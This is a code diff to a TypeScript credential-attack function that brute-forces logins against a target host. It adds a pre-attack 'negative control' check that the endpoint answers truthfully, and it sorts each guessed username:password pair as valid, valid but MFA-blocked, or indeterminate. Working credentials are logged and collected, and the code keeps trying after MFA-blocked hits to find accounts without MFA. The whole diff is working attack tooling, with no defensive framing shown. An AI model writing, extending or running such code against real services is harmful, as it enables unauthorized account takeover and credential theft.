@@ -812,6 +812,37 @@ export async function executeCredentialAttack(config: AttackConfig): Promise<Att
 
   console.log(`[CredAttack] Starting ${config.mode} attack against ${config.target.host}:${config.target.port} (${config.target.protocol})`);
 
+  // ─── Negative-Control Canary (Pre-Attack) ───
+  // Verify the endpoint is giving truthful responses before committing to the batch
+  let negativeControlPassed = true;
+  try {
+    const { runNegativeControl } = await import("./credential-verification-gates");
+    const isHttpForm = config.target.protocol === "http_form" || config.target.protocol === "http_json_api";
+    if (isHttpForm && config.target.loginUrl) {
+      const canaryTestFn = async (username: string, password: string) => {
+        return testHttpForm(
+          config.target.host, config.target.port, username, password,
+          config.timeoutPerAttemptMs, config.target.loginUrl,
+          config.target.loginFormAction, config.target.usernameField,
+          config.target.passwordField, config.target.csrfTokenName,
+          config.target.csrfTokenUrl, config.target.successIndicator,
+          config.target.failureIndicator, config.target.contentType,
+        );
+      };
+      const canaryResult = await runNegativeControl(canaryTestFn);
+      if (!canaryResult.passed) {
+        console.error(`[CredAttack] ⚠ NEGATIVE CONTROL FAILED: ${canaryResult.reason}`);
+        negativeControlPassed = false;
+        errors.push(`NEGATIVE_CONTROL: ${canaryResult.reason}`);
+        // Don't abort — proceed but flag results as unreliable
+      } else {
+        console.log(`[CredAttack] ✓ Negative control passed — endpoint is giving truthful responses`);
+      }
+    }
+  } catch (ncErr: any) {
+    console.warn(`[CredAttack] Negative control check failed (non-fatal): ${ncErr.message}`);
+  }
+
   // Build credential pairs based on mode
   let pairs: CredentialPair[] = [];
 
@@ -940,8 +971,12 @@ export async function executeCredentialAttack(config: AttackConfig): Promise<Att
 
     recentResponses.push(result);
 
-    if (result.success) {
-      console.log(`[CredAttack] ✓ SUCCESS: ${pair.username}:${pair.password} on ${config.target.host}:${config.target.port}`);
+    // Four-state credential classification
+    const { classifyCredentialResult } = await import("./credential-verification-gates");
+    const classification = classifyCredentialResult(pair.username, pair.password, result, pair.source);
+
+    if (classification.state === "VALID") {
+      console.log(`[CredAttack] ✓ VALID: ${pair.username}:${pair.password} on ${config.target.host}:${config.target.port}`);
       successfulLogins.push({
         username: pair.username,
         password: pair.password,
@@ -949,11 +984,24 @@ export async function executeCredentialAttack(config: AttackConfig): Promise<Att
         responseCode: result.responseCode,
         responseSnippet: result.responseSnippet,
         additionalInfo: pair.source,
+        accessLevel: "full",
       });
-
-      if (config.stopOnFirstSuccess) {
-        break;
-      }
+      if (config.stopOnFirstSuccess) break;
+    } else if (classification.state === "VALID_MFA_BLOCKED") {
+      console.log(`[CredAttack] ⚠ MFA_BLOCKED: ${pair.username}:${pair.password} — password correct but MFA prevents session`);
+      successfulLogins.push({
+        username: pair.username,
+        password: pair.password,
+        timestamp: Date.now(),
+        responseCode: result.responseCode,
+        responseSnippet: result.responseSnippet,
+        additionalInfo: `${pair.source || ""} [MFA_BLOCKED: ${classification.evidence.mfaIndicators?.join(", ")}]`.trim(),
+        accessLevel: "mfa_blocked",
+      });
+      // Don't stop on MFA-blocked — continue looking for accounts without MFA
+    } else if (classification.state === "INDETERMINATE" && !negativeControlPassed) {
+      // If negative control already failed and we get indeterminate results, skip logging
+      console.warn(`[CredAttack] ? INDETERMINATE (unreliable): ${pair.username} — endpoint may not be truthful`);
     }
 
     // Lockout detection (check every 5 attempts)
